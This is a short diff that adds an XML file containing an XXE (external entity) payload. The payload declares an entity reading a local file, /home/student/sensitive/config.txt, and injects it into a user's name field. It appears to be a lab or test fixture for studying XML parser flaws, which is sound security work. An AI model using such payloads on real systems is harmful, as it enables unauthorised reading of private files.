@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE users [
+    <!ENTITY xxe SYSTEM "file:///home/student/sensitive/config.txt">
+]>
+<users>
+    <user>
+        <name>&xxe;</name>
+        <email>config@example.com</email>
+    </user>
+</users>
